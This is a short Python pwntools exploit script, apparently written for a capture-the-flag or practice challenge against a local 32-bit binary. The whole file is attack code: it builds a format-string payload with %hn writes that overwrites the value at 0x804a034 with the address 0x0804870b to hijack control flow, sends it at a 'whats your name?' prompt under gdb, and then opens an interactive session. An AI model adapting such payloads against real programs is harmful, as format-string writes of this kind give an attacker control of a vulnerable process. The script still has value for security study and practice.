#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("/tmp/32_new", checksec=False)
#libc = ELF("/tmp/libc6_2.27-0ubuntu3_i386.so", checksec=False)

p = process()
#p = remote()

goal = 0x0804870b
g1 = goal>>16 & 0xffff
g2 = goal & 0xffff

log.info(f"{hex(g1)} : {hex(g2)}")

gdb.attach(p, gdbscript='''
        b*0x080487DC
        x 0x804a034
        c
        x 0x804a034
''')


input()
payload = b""
payload += f"%{g1-0x46}c%88$hn".encode()
payload += f"%{g2-g1}c%89$hn".encode()
payload = payload.ljust(42, b'A')
payload += p32(0x804a034+2)
payload += p32(0x804a034)
p.sendlineafter(b"whats your name?", payload)

p.interactive()
